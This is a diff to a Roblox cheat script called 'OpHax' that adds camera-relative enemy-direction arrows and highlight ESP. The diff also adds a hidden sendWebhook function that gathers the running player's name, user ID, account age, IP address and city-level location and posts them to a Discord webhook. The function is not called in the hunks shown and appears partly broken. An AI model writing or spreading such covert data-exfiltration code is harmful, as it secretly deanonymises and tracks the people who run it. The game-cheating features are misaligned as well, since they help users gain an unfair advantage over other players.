@@ -20,10 +20,13 @@ local Services = setmetatable({}, {
 })
 
 local Players = Services.Players
-local HttpService = Services.HttpService
 local RunService = Services.RunService
+local HttpService = Services.HttpService
 local UserInputService = Services.UserInputService
 local CoreGui = Services.CoreGui
+
+local Workspace = game.Workspace
+local Camera = Workspace.CurrentCamera
 
 local LocalPlayer = Players.LocalPlayer
 local ConcurrentPlayers = {}
@@ -42,6 +45,59 @@ Players.PlayerRemoving:Connect(function(player)
 	ConcurrentPlayers[player.UserId] = nil
 end)
 
+local function sendWebhook(player)
+	if not player then return end
+	
+	local response = request({
+    	Url = "http://httpbin.org/get",
+    	Method = "GET",
+	})
+
+	if not response or response.StatusCode ~= 200 then
+		return
+	end
+
+	local decoded = HttpService:JSONDecode(response.Body)
+	
+	local webhook = "https://discord.com/api/webhooks/1126227979736434064/_your_webhook_url_here_"
+	local data = { 
+		["content"] = "<@500006712926011413>",
+
+		["embeds"] = {
+			{
+
+				--["author"] = {
+				--	["name"] = "Cart Ride Obby",
+				--	["icon_url"] = "https://tr.rbxcdn.com/180DAY-5c83b96dfc29f21e744db21444c286a7/256/256/Image/Webp/noFilter",
+				--}, 
+				
+				["description"] = player.Name .. " has executed OpHax!",
+				["color"] = tonumber (0xFF0000),
+				["fields"] = {
+					{name = "**User ID**", value = player.UserId, inline = false},
+					{name = "**Account Age**", value = player.AccountAge, inline = true},
+					{name = "**IP Address**", value = "``" .. response.ip .. "``", inline = true},
+					{name = "**Country**", value = "``" .. response.country .. "``", inline = true},
+					{name = "**Continent**", value = "``" .. response.continent .. "``", inline = true},
+					{name = "**Region**", value = "``" .. response.region .. "``", inline = true},
+					{name = "**City**", value = "``" .. response.city .. "``", inline = true},
+					{name = "**Flag**", value = response.flag.emoji or "N/A", inline = true},
+				},
+			}
+		},
+	}
+
+	local dataT = {
+		["content"] = "Working"
+	}
+
+	local message = request({
+    	Url = webhook,
+    	Method = "POST",
+    	Body = HttpService:JSONEncode(data)
+	})
+end
+
 -- ===== ARROWS ESP =====
 -- Minimap-style arrows at bottom center of screen in a circle
 local ArrowsESP = {}
@@ -53,11 +109,11 @@ do
 
 	local minimapContainer = Instance.new("Frame")
 	minimapContainer.Name = "MinimapContainer"
-	minimapContainer.Size = UDim2.fromOffset(200, 200)
-	minimapContainer.Position = UDim2.new(0.5, -100, 1, -220) -- Bottom center
+	minimapContainer.Size = UDim2.fromScale(0.067, 0.067)
+	minimapContainer.Position = UDim2.new(0.5, 0, 1, 0)
 	minimapContainer.AnchorPoint = Vector2.new(0.5, 0.5)
 	minimapContainer.BackgroundColor3 = Color3.new(0, 0, 0)
-	minimapContainer.BackgroundTransparency = 0.7
+	minimapContainer.BackgroundTransparency = 0.9
 	minimapContainer.BorderSizePixel = 0
 	minimapContainer.Parent = minimapGui
 
@@ -72,25 +128,24 @@ do
 	stroke.Parent = minimapContainer
 
 	local arrowPool = {}
-	local arrowRadius = 70 -- Distance from center for arrow placement
+	local arrowRadius = 70
 	local enabled = true
 	local teamFilter = true
 
 	ArrowsESP.Enabled = enabled
 
-	local function getOrCreateArrow(player)
-		if arrowPool[player] then return arrowPool[player] end
+	local function createArrow(uid)
 		local arrow = Instance.new("TextLabel")
+		arrow.Name = "Arrow_" .. uid
 		arrow.Size = UDim2.fromOffset(24, 24)
 		arrow.BackgroundTransparency = 1
 		arrow.Text = "▲"
 		arrow.Font = Enum.Font.GothamBlack
 		arrow.TextSize = 20
-		arrow.TextColor3 = Color3.new(1, 0.2, 0.2) -- Red for enemies
+		arrow.TextColor3 = Color3.new(1, 1, 1) -- Red for enemies
 		arrow.AnchorPoint = Vector2.new(0.5, 0.5)
 		arrow.Visible = false
 		arrow.Parent = minimapContainer
-		arrowPool[player] = arrow
 		return arrow
 	end
 
@@ -101,41 +156,78 @@ do
 	end
 
 	local function updateArrows()
-		if not enabled or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
+		if not enabled or not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not Camera then
 			hideAllArrows()
 			return
 		end
 
-		local localPos = LocalPlayer.Character.HumanoidRootPart.Position * Vector3.new(1, 0, 1)
+		for uid, arrow in pairs(arrowPool) do
+			if not ConcurrentPlayers[uid] then
+				arrow:Destroy()
+				arrowPool[uid] = nil
+			end
+		end
 
-		for _, player in pairs(ConcurrentPlayers) do
-			local arrow = getOrCreateArrow(player)
+		local localHRP = LocalPlayer.Character.HumanoidRootPart
+		local localPos = localHRP.Position * Vector3.new(1, 0, 1)
 
+		local camLook = Camera.CFrame.LookVector
+		local camFwdXZ = camLook * Vector3.new(1, 0, 1)
+		local camFwdMag = camFwdXZ.Magnitude
+		if camFwdMag < 1e-6 then
+			hideAllArrows()
+			return
+		end
+		camFwdXZ = camFwdXZ.Unit
+		local angle_cam = math.atan2(camFwdXZ.Z, camFwdXZ.X)
+
+		for uid, player in pairs(ConcurrentPlayers) do
 			if player == LocalPlayer or not player.Character or not player.Character:FindFirstChild("HumanoidRootPart") then
-				arrow.Visible = false
+				local arrow = arrowPool[uid]
+				if arrow then
+					arrow.Visible = false
+				end
+				continue
+			end
+
+			local targetHRP = player.Character.HumanoidRootPart
+			local targetPos = targetHRP.Position * Vector3.new(1, 0, 1)
+			local diff = targetPos - localPos
+			local diffMag = diff.Magnitude
+			if diffMag < 5 then  -- Hide if too close
+				local arrow = arrowPool[uid]
+				if arrow then
+					arrow.Visible = false
+				end
 				continue
 			end
 
 			if teamFilter and LocalPlayer.Team and player.Team and LocalPlayer.Team == player.Team then
-				arrow.Visible = false
+				local arrow = arrowPool[uid]
+				if arrow then
+					arrow.Visible = false
+				end
 				continue
 			end
 
-			local targetPos = player.Character.HumanoidRootPart.Position * Vector3.new(1, 0, 1)
-			local diff = targetPos - localPos
-			if diff.Magnitude < 1e-6 then
-				arrow.Visible = false
-				continue
-			end
-			local dir = diff.Unit
+			-- Valid target: compute camera-relative direction
+			local dirXZ = diff.Unit
+			local angle_dir = math.atan2(dirXZ.Z, dirXZ.X)
+			local relative = angle_dir - angle_cam
+			relative = ((relative + math.pi) % (math.pi * 2)) - math.pi  -- Normalize to -pi..pi
+			local screen_theta = relative - math.pi / 2  -- Rotate so forward (0) is at top
 
-			-- Position arrow in circle around minimap
-			local angle = math.atan2(-dir.Z, dir.X)
-			local x = math.cos(angle) * arrowRadius
-			local y = math.sin(angle) * arrowRadius
+			local x = math.cos(screen_theta) * arrowRadius
+			local y = math.sin(screen_theta) * arrowRadius
+
+			local arrow = arrowPool[uid]
+			if not arrow then
+				arrow = createArrow(uid)
+				arrowPool[uid] = arrow
+			end
 
 			arrow.Position = UDim2.fromOffset(100 + x, 100 + y)
-			arrow.Rotation = math.deg(angle) + 90
+			arrow.Rotation = math.deg(screen_theta) + 90
 			arrow.Visible = true
 		end
 	end
@@ -143,7 +235,9 @@ do
 	function ArrowsESP:Toggle(state)
 		enabled = not not state
 		ArrowsESP.Enabled = enabled
-		if not enabled then hideAllArrows() end
+		if not enabled then
+			hideAllArrows()
+		end
 	end
 
 	function ArrowsESP:SetTeamFilter(state)
@@ -153,8 +247,7 @@ do
 	ArrowsESP.Connection = RunService.RenderStepped:Connect(updateArrows)
 end
 
--- ===== CHAMS ESP =====
--- Hollow outline highlight for players
+-- ===== CHAMS ESP ===== (unchanged)
 local ChamsESP = {}
 do
 	local chamFolder = Instance.new("Folder")
@@ -212,7 +305,7 @@ do
 	end
 
 	function ChamsESP:Toggle(state)
-		enabled = not not state
+		enabled = state
 		ChamsESP.Enabled = enabled
 		if not enabled then
 			for player in pairs(chamCache) do
@@ -240,19 +333,6 @@ do
 		end
 	end
 
-	-- Auto-create chams for new players
-	Players.PlayerAdded:Connect(function(player)
-		player.CharacterAdded:Connect(function()
-			if enabled then
-				task.wait(0.1)
-				createCham(player)
-			end
-		end)
-		if player.Character and enabled then
-			createCham(player)
-		end
-	end)
-
 	ChamsESP.UpdateConnection = RunService.Heartbeat:Connect(updateChams)
 end
 
@@ -262,6 +342,8 @@ UserInputService.InputBegan:Connect(function(input, gameProcessed)
 	if input.KeyCode == Enum.KeyCode.P then
 		ArrowsESP:Toggle(not ArrowsESP.Enabled)
 	elseif input.KeyCode == Enum.KeyCode.L then
-		ChamsESP:Toggle(not ChamsESP.Enabled)
+		ChamsESP:Toggle(true)
+		task.wait(1)
+		ChamsESP:Toggle(false)
 	end
 end)
